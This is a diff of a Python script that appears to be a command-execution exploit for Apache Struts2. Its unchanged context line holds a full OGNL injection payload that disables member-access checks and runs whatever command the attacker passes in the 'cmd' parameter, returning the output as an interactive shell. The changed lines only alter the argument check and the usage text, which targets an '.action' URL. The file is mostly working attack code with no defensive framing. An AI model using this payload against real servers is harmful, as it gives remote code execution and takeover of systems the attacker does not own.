@@ -6,7 +6,7 @@ import sys
 '''
 author:wanger@wooyun.org
 '''
-if sys.argv[1]:
+if len(sys.argv) == 2:
     link = sys.argv[1]
     s1 = link + "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd="
     s2 = "&pp=\\A&ppp=%20&encoding=UTF-8"
@@ -31,7 +31,7 @@ if sys.argv[1]:
             sys.exit()
 
 else:
-    print "Input Eorro!\n"
-    print "USG:\n python cmd.py http://1.2.3.4:8080/xxx.action"
+    print "USG:\npython cmd.py http://1.2.3.4:8080/xxx.action"
+    print "use '\q' to exit the shell"
     sys.exit()
     
